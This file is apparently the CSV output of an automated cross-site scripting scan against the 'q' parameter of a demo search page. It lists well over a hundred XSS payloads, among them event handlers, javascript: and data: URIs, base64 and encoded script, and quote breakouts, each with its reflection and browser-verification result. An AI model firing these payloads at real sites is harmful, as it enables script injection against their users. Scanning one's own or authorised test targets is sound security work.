Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 17:43:11.707,2026-01-10 17:43:11.814,0.107,https://demo-knsl.onrender.com/search,GET,q,<iframe%20src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:11.710,2026-01-10 17:43:11.819,0.109,https://demo-knsl.onrender.com/search,GET,q,<object/data=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:11.719,2026-01-10 17:43:11.834,0.115,https://demo-knsl.onrender.com/search,GET,q,"<object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:11.126,2026-01-10 17:43:11.881,0.755,https://demo-knsl.onrender.com/search,GET,q,<input type=hidden onfocus=alert(1) autofocus>,RAW_REFLECTION,No,,High
2026-01-10 17:43:11.814,2026-01-10 17:43:11.924,0.110,https://demo-knsl.onrender.com/search,GET,q,<embed/src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:11.834,2026-01-10 17:43:11.938,0.104,https://demo-knsl.onrender.com/search,GET,q,<var onmouseover=alert(1)>X</var>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:11.881,2026-01-10 17:43:11.979,0.098,https://demo-knsl.onrender.com/search,GET,q,<code onmouseover=alert(1)>X</code>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:11.924,2026-01-10 17:43:12.032,0.108,https://demo-knsl.onrender.com/search,GET,q,<span onmouseover=alert(1)>X</span>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:11.938,2026-01-10 17:43:12.045,0.107,https://demo-knsl.onrender.com/search,GET,q,<p onmouseover=alert(1)>X</p>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:11.979,2026-01-10 17:43:12.080,0.101,https://demo-knsl.onrender.com/search,GET,q,<h1 onmouseover=alert(1)>X</h1>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:12.032,2026-01-10 17:43:12.140,0.109,https://demo-knsl.onrender.com/search,GET,q,<h2 onmouseover=alert(1)>X</h2>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:12.045,2026-01-10 17:43:12.146,0.101,https://demo-knsl.onrender.com/search,GET,q,<pre onmouseover=alert(1)>X</pre>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:12.080,2026-01-10 17:43:12.189,0.109,https://demo-knsl.onrender.com/search,GET,q,<blockquote onmouseover=alert(1)>X</blockquote>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:12.140,2026-01-10 17:43:12.250,0.110,https://demo-knsl.onrender.com/search,GET,q,<ol onmouseover=alert(1)><li>X</li></ol>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:12.146,2026-01-10 17:43:12.260,0.114,https://demo-knsl.onrender.com/search,GET,q,<ul onmouseover=alert(1)><li>X</li></ul>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:12.189,2026-01-10 17:43:12.295,0.106,https://demo-knsl.onrender.com/search,GET,q,<li onmouseover=alert(1)>X</li>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:12.250,2026-01-10 17:43:12.350,0.100,https://demo-knsl.onrender.com/search,GET,q,<dl onmouseover=alert(1)><dt>X</dt></dl>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:12.260,2026-01-10 17:43:12.373,0.113,https://demo-knsl.onrender.com/search,GET,q,<dt onmouseover=alert(1)>X</dt>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:12.295,2026-01-10 17:43:12.403,0.108,https://demo-knsl.onrender.com/search,GET,q,<dd onmouseover=alert(1)>X</dd>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:12.350,2026-01-10 17:43:12.459,0.110,https://demo-knsl.onrender.com/search,GET,q,<fieldset onmouseover=alert(1)>X</fieldset>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:12.373,2026-01-10 17:43:12.475,0.102,https://demo-knsl.onrender.com/search,GET,q,<legend onmouseover=alert(1)>X</legend>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:12.403,2026-01-10 17:43:12.505,0.102,https://demo-knsl.onrender.com/search,GET,q,<label onmouseover=alert(1)>X</label>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:12.459,2026-01-10 17:43:12.512,0.053,https://demo-knsl.onrender.com/search,GET,q,<table><caption onmouseover=alert(1)>X</caption></table>,NO_REFLECTION,No,,Info
2026-01-10 17:43:11.819,2026-01-10 17:43:12.563,0.745,https://demo-knsl.onrender.com/search,GET,q,"<embed src=data:text/html,<script>alert(1)</script>>",RAW_REFLECTION,No,,High
2026-01-10 17:43:12.475,2026-01-10 17:43:12.582,0.107,https://demo-knsl.onrender.com/search,GET,q,<table><colgroup onmouseover=alert(1)></colgroup></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:12.512,2026-01-10 17:43:12.619,0.107,https://demo-knsl.onrender.com/search,GET,q,<table><thead onmouseover=alert(1)></thead></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:12.563,2026-01-10 17:43:12.663,0.099,https://demo-knsl.onrender.com/search,GET,q,<table><tbody onmouseover=alert(1)></tbody></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:12.582,2026-01-10 17:43:12.687,0.105,https://demo-knsl.onrender.com/search,GET,q,<table><tfoot onmouseover=alert(1)></tfoot></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:12.619,2026-01-10 17:43:12.738,0.119,https://demo-knsl.onrender.com/search,GET,q,<table><tr onmouseover=alert(1)></tr></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:12.663,2026-01-10 17:43:12.766,0.103,https://demo-knsl.onrender.com/search,GET,q,<table><th onmouseover=alert(1)>X</th></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:12.687,2026-01-10 17:43:12.794,0.107,https://demo-knsl.onrender.com/search,GET,q,<table><td onmouseover=alert(1)>X</td></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:12.738,2026-01-10 17:43:12.844,0.105,https://demo-knsl.onrender.com/search,GET,q,<meter onmouseover=alert(1)>X</meter>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:12.766,2026-01-10 17:43:12.875,0.109,https://demo-knsl.onrender.com/search,GET,q,<progress onmouseover=alert(1)>X</progress>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:12.794,2026-01-10 17:43:12.895,0.101,https://demo-knsl.onrender.com/search,GET,q,<output onmouseover=alert(1)>X</output>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:12.844,2026-01-10 17:43:12.942,0.099,https://demo-knsl.onrender.com/search,GET,q,<time onmouseover=alert(1)>X</time>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:12.875,2026-01-10 17:43:12.980,0.105,https://demo-knsl.onrender.com/search,GET,q,<mark onmouseover=alert(1)>X</mark>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:12.895,2026-01-10 17:43:13.000,0.105,https://demo-knsl.onrender.com/search,GET,q,<ruby onmouseover=alert(1)>X</ruby>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:12.942,2026-01-10 17:43:13.062,0.119,https://demo-knsl.onrender.com/search,GET,q,<ruby><rt onmouseover=alert(1)>X</rt></ruby>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:12.980,2026-01-10 17:43:13.088,0.108,https://demo-knsl.onrender.com/search,GET,q,<ruby><rp onmouseover=alert(1)>X</rp></ruby>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:13.000,2026-01-10 17:43:13.103,0.103,https://demo-knsl.onrender.com/search,GET,q,<bdi onmouseover=alert(1)>X</bdi>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:13.062,2026-01-10 17:43:13.176,0.114,https://demo-knsl.onrender.com/search,GET,q,<bdo onmouseover=alert(1)>X</bdo>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:13.088,2026-01-10 17:43:13.206,0.118,https://demo-knsl.onrender.com/search,GET,q,<wbr onmouseover=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:13.103,2026-01-10 17:43:13.209,0.106,https://demo-knsl.onrender.com/search,GET,q,<ins onmouseover=alert(1)>X</ins>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:12.505,2026-01-10 17:43:13.231,0.725,https://demo-knsl.onrender.com/search,GET,q,<table><col onmouseover=alert(1)></table>,RAW_REFLECTION,No,,High
2026-01-10 17:43:13.209,2026-01-10 17:43:13.268,0.059,https://demo-knsl.onrender.com/search,GET,q,<strong onmouseover=alert(1)>X</strong>,NO_REFLECTION,No,,Info
2026-01-10 17:43:13.176,2026-01-10 17:43:13.282,0.106,https://demo-knsl.onrender.com/search,GET,q,<del onmouseover=alert(1)>X</del>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:13.231,2026-01-10 17:43:13.341,0.110,https://demo-knsl.onrender.com/search,GET,q,<em onmouseover=alert(1)>X</em>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:13.268,2026-01-10 17:43:13.368,0.100,https://demo-knsl.onrender.com/search,GET,q,<b onmouseover=alert(1)>X</b>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:13.282,2026-01-10 17:43:13.399,0.118,https://demo-knsl.onrender.com/search,GET,q,<i onmouseover=alert(1)>X</i>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:13.341,2026-01-10 17:43:13.450,0.110,https://demo-knsl.onrender.com/search,GET,q,<u onmouseover=alert(1)>X</u>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:13.368,2026-01-10 17:43:13.470,0.102,https://demo-knsl.onrender.com/search,GET,q,<s onmouseover=alert(1)>X</s>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:13.399,2026-01-10 17:43:13.510,0.111,https://demo-knsl.onrender.com/search,GET,q,<sub onmouseover=alert(1)>X</sub>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:02.423,2026-01-10 17:43:13.531,11.108,https://demo-knsl.onrender.com/search,GET,q,<img src=x onabort=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:02.423,2026-01-10 17:43:13.534,11.111,https://demo-knsl.onrender.com/search,GET,q,<script>eval('\x61lert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:02.423,2026-01-10 17:43:13.550,11.127,https://demo-knsl.onrender.com/search,GET,q,<img src=x onactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:13.450,2026-01-10 17:43:13.553,0.102,https://demo-knsl.onrender.com/search,GET,q,<sup onmouseover=alert(1)>X</sup>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:13.470,2026-01-10 17:43:13.573,0.103,https://demo-knsl.onrender.com/search,GET,q,<abbr onmouseover=alert(1)>X</abbr>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:13.510,2026-01-10 17:43:13.615,0.104,https://demo-knsl.onrender.com/search,GET,q,<address onmouseover=alert(1)>X</address>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:13.531,2026-01-10 17:43:13.629,0.097,https://demo-knsl.onrender.com/search,GET,q,<article onmouseover=alert(1)>X</article>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:13.534,2026-01-10 17:43:13.632,0.098,https://demo-knsl.onrender.com/search,GET,q,<aside onmouseover=alert(1)>X</aside>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:42:51.880,2026-01-10 17:43:13.642,21.762,https://demo-knsl.onrender.com/search,GET,q,<script>\u0061lert(1)</script>,RAW_REFLECTION,No,,High
2026-01-10 17:43:13.550,2026-01-10 17:43:13.663,0.113,https://demo-knsl.onrender.com/search,GET,q,<footer onmouseover=alert(1)>X</footer>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:13.573,2026-01-10 17:43:13.682,0.109,https://demo-knsl.onrender.com/search,GET,q,<hgroup onmouseover=alert(1)>X</hgroup>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:13.629,2026-01-10 17:43:13.687,0.058,https://demo-knsl.onrender.com/search,GET,q,<section onmouseover=alert(1)>X</section>,NO_REFLECTION,No,,Info
2026-01-10 17:42:51.880,2026-01-10 17:43:13.690,21.810,https://demo-knsl.onrender.com/search,GET,q,<div onload=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:42:51.880,2026-01-10 17:43:13.701,21.821,https://demo-knsl.onrender.com/search,GET,q,<script>alert&#x28;1&#x29;</script>,RAW_REFLECTION,No,,High
2026-01-10 17:43:13.663,2026-01-10 17:43:13.717,0.055,https://demo-knsl.onrender.com/search,GET,q,<figcaption onmouseover=alert(1)>X</figcaption>,NO_REFLECTION,No,,Info
2026-01-10 17:43:13.615,2026-01-10 17:43:13.725,0.110,https://demo-knsl.onrender.com/search,GET,q,<nav onmouseover=alert(1)>X</nav>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:13.725,2026-01-10 17:43:13.782,0.057,https://demo-knsl.onrender.com/search,GET,q,<button onclick=alert(1)>X</button>,NO_REFLECTION,No,,Info
2026-01-10 17:43:13.682,2026-01-10 17:43:13.783,0.101,https://demo-knsl.onrender.com/search,GET,q,<dialog onmouseover=alert(1)>X</dialog>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:13.687,2026-01-10 17:43:13.797,0.110,https://demo-knsl.onrender.com/search,GET,q,<menu onmouseover=alert(1)>X</menu>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:13.690,2026-01-10 17:43:13.801,0.111,https://demo-knsl.onrender.com/search,GET,q,<menuitem onmouseover=alert(1)>X</menuitem>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:13.701,2026-01-10 17:43:13.803,0.103,https://demo-knsl.onrender.com/search,GET,q,<details><summary onmouseover=alert(1)>X</summary></details>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:13.717,2026-01-10 17:43:13.824,0.107,https://demo-knsl.onrender.com/search,GET,q,<canvas onmouseover=alert(1)>X</canvas>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:13.782,2026-01-10 17:43:13.842,0.060,https://demo-knsl.onrender.com/search,GET,q,<button ondblclick=alert(1)>X</button>,NO_REFLECTION,No,,Info
2026-01-10 17:43:13.783,2026-01-10 17:43:13.843,0.060,https://demo-knsl.onrender.com/search,GET,q,<button onmousedown=alert(1)>X</button>,NO_REFLECTION,No,,Info
2026-01-10 17:43:13.797,2026-01-10 17:43:13.851,0.055,https://demo-knsl.onrender.com/search,GET,q,<button onmouseup=alert(1)>X</button>,NO_REFLECTION,No,,Info
2026-01-10 17:43:13.803,2026-01-10 17:43:13.901,0.098,https://demo-knsl.onrender.com/search,GET,q,'><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:13.801,2026-01-10 17:43:13.905,0.104,https://demo-knsl.onrender.com/search,GET,q,"""><script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:13.824,2026-01-10 17:43:13.926,0.102,https://demo-knsl.onrender.com/search,GET,q,"""></script><script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:13.206,2026-01-10 17:43:13.929,0.723,https://demo-knsl.onrender.com/search,GET,q,<small onmouseover=alert(1)>X</small>,RAW_REFLECTION,No,,High
2026-01-10 17:43:13.843,2026-01-10 17:43:13.953,0.110,https://demo-knsl.onrender.com/search,GET,q,""";alert(1);//",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:13.851,2026-01-10 17:43:13.956,0.105,https://demo-knsl.onrender.com/search,GET,q,""" onmouseover=alert(1) x=""",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:13.901,2026-01-10 17:43:14.021,0.119,https://demo-knsl.onrender.com/search,GET,q,"""onmouseover=""alert(1)",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:13.905,2026-01-10 17:43:14.024,0.119,https://demo-knsl.onrender.com/search,GET,q,' onmouseover=alert(1) x=',RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:13.926,2026-01-10 17:43:14.029,0.103,https://demo-knsl.onrender.com/search,GET,q,""" autofocus onfocus=alert(1) x=""",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:13.929,2026-01-10 17:43:14.032,0.103,https://demo-knsl.onrender.com/search,GET,q,' autofocus onfocus=alert(1) x=',RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:13.953,2026-01-10 17:43:14.058,0.106,https://demo-knsl.onrender.com/search,GET,q,</script><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:13.956,2026-01-10 17:43:14.064,0.108,https://demo-knsl.onrender.com/search,GET,q,</script><img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.021,2026-01-10 17:43:14.129,0.108,https://demo-knsl.onrender.com/search,GET,q,</script><svg onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.024,2026-01-10 17:43:14.133,0.109,https://demo-knsl.onrender.com/search,GET,q,--><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.029,2026-01-10 17:43:14.138,0.109,https://demo-knsl.onrender.com/search,GET,q,--!><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.032,2026-01-10 17:43:14.153,0.120,https://demo-knsl.onrender.com/search,GET,q,<q/oncut=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.058,2026-01-10 17:43:14.161,0.103,https://demo-knsl.onrender.com/search,GET,q,<q/onclick=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.064,2026-01-10 17:43:14.170,0.106,https://demo-knsl.onrender.com/search,GET,q,<q/ondrag=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.129,2026-01-10 17:43:14.241,0.112,https://demo-knsl.onrender.com/search,GET,q,<q/onerror=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.138,2026-01-10 17:43:14.245,0.107,https://demo-knsl.onrender.com/search,GET,q,<a name=x onclick=alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.133,2026-01-10 17:43:14.247,0.114,https://demo-knsl.onrender.com/search,GET,q,<a href=#x onclick=alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.153,2026-01-10 17:43:14.257,0.105,https://demo-knsl.onrender.com/search,GET,q,<a href=x target=_blank onclick=alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.170,2026-01-10 17:43:14.279,0.109,https://demo-knsl.onrender.com/search,GET,q,"'"">><marquee onstart=prompt(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.161,2026-01-10 17:43:14.285,0.123,https://demo-knsl.onrender.com/search,GET,q,"'"">><marquee onstart=confirm(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.247,2026-01-10 17:43:14.301,0.054,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=alert(1) onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-10 17:43:14.241,2026-01-10 17:43:14.345,0.104,https://demo-knsl.onrender.com/search,GET,q,"'"">><div onmouseover=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.245,2026-01-10 17:43:14.365,0.120,https://demo-knsl.onrender.com/search,GET,q,<img src=x oneonerrorrror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.257,2026-01-10 17:43:14.368,0.110,https://demo-knsl.onrender.com/search,GET,q,<button formaction=javascript:alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.279,2026-01-10 17:43:14.389,0.110,https://demo-knsl.onrender.com/search,GET,q,<input type=submit formaction=javascript:alert(1) value=X>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.285,2026-01-10 17:43:14.393,0.109,https://demo-knsl.onrender.com/search,GET,q,<form action=javascript:alert(1)><button>X</button></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:13.553,2026-01-10 17:43:14.411,0.859,https://demo-knsl.onrender.com/search,GET,q,<header onmouseover=alert(1)>X</header>,RAW_REFLECTION,No,,High
2026-01-10 17:43:14.301,2026-01-10 17:43:14.415,0.114,https://demo-knsl.onrender.com/search,GET,q,<video poster=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:13.632,2026-01-10 17:43:14.467,0.835,https://demo-knsl.onrender.com/search,GET,q,<main onmouseover=alert(1)>X</main>,RAW_REFLECTION,No,,High
2026-01-10 17:43:13.642,2026-01-10 17:43:14.473,0.831,https://demo-knsl.onrender.com/search,GET,q,<figure onmouseover=alert(1)>X</figure>,RAW_REFLECTION,No,,High
2026-01-10 17:43:14.368,2026-01-10 17:43:14.482,0.114,https://demo-knsl.onrender.com/search,GET,q,<img lowsrc=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.393,2026-01-10 17:43:14.499,0.106,https://demo-knsl.onrender.com/search,GET,q,<a href=vbscript:msgbox(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.411,2026-01-10 17:43:14.514,0.103,https://demo-knsl.onrender.com/search,GET,q,<a href=about:blank>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.415,2026-01-10 17:43:14.531,0.115,https://demo-knsl.onrender.com/search,GET,q,"<input pattern="".*"" title=""test"" onmouseover=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.467,2026-01-10 17:43:14.574,0.107,https://demo-knsl.onrender.com/search,GET,q,"<input placeholder=""test"" onmouseover=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:13.842,2026-01-10 17:43:14.577,0.734,https://demo-knsl.onrender.com/search,GET,q,';alert(1);//,RAW_REFLECTION,No,,High
2026-01-10 17:43:14.473,2026-01-10 17:43:14.578,0.106,https://demo-knsl.onrender.com/search,GET,q,"<div title=""test"" onmouseover=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.499,2026-01-10 17:43:14.601,0.102,https://demo-knsl.onrender.com/search,GET,q,<blockquote cite=javascript:alert(1)>X</blockquote>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.514,2026-01-10 17:43:14.616,0.102,https://demo-knsl.onrender.com/search,GET,q,<img longdesc=javascript:alert(1) src=x>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.531,2026-01-10 17:43:14.663,0.132,https://demo-knsl.onrender.com/search,GET,q,<img usemap=#x src=x><map name=x><area onclick=alert(1)></map>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.574,2026-01-10 17:43:14.671,0.098,https://demo-knsl.onrender.com/search,GET,q,<img ismap src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.577,2026-01-10 17:43:14.695,0.119,https://demo-knsl.onrender.com/search,GET,q,<input dirname=test onchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.578,2026-01-10 17:43:14.700,0.122,https://demo-knsl.onrender.com/search,GET,q,<svg><script>alert&#40;1&#41;</script></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.601,2026-01-10 17:43:14.704,0.103,https://demo-knsl.onrender.com/search,GET,q,<svg><script>alert&#x28;1&#x29;</script></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.616,2026-01-10 17:43:14.728,0.113,https://demo-knsl.onrender.com/search,GET,q,<svg><script>&#97;lert(1)</script></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.663,2026-01-10 17:43:14.770,0.108,https://demo-knsl.onrender.com/search,GET,q,"<div style=""xss:expression(alert(1))"">X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.671,2026-01-10 17:43:14.774,0.103,https://demo-knsl.onrender.com/search,GET,q,"<div style=""background:expression(alert(1))"">X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.695,2026-01-10 17:43:14.799,0.103,https://demo-knsl.onrender.com/search,GET,q,"<script type=importmap>{""imports"":{""x"":""javascript:alert(1)""}}</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.482,2026-01-10 17:43:14.812,0.330,https://demo-knsl.onrender.com/search,GET,q,"<img alt=""test"" src=x onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.704,2026-01-10 17:43:14.814,0.110,https://demo-knsl.onrender.com/search,GET,q,"<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.700,2026-01-10 17:43:14.818,0.117,https://demo-knsl.onrender.com/search,GET,q,<div id=x><template shadowroot=open><style>*{color:red}</style><img src=x onerror=alert(1)></template></div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.728,2026-01-10 17:43:14.838,0.110,https://demo-knsl.onrender.com/search,GET,q,"<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.774,2026-01-10 17:43:14.886,0.112,https://demo-knsl.onrender.com/search,GET,q,<image src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.799,2026-01-10 17:43:14.910,0.111,https://demo-knsl.onrender.com/search,GET,q,<isindex type=submit value=X onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.812,2026-01-10 17:43:14.922,0.110,https://demo-knsl.onrender.com/search,GET,q,<bgsound src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.814,2026-01-10 17:43:14.925,0.111,https://demo-knsl.onrender.com/search,GET,q,<applet code=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.818,2026-01-10 17:43:14.934,0.116,https://demo-knsl.onrender.com/search,GET,q,<script>al\u0065rt(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.838,2026-01-10 17:43:14.954,0.116,https://demo-knsl.onrender.com/search,GET,q,<script>al\x65rt(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.886,2026-01-10 17:43:14.996,0.111,https://demo-knsl.onrender.com/search,GET,q,<script>eval('al'+'ert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:43:14.910,2026-01-10 17:43:15.010,0.100,https://demo-knsl.onrender.com/search,GET,q,<script>eval('al\x65rt(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
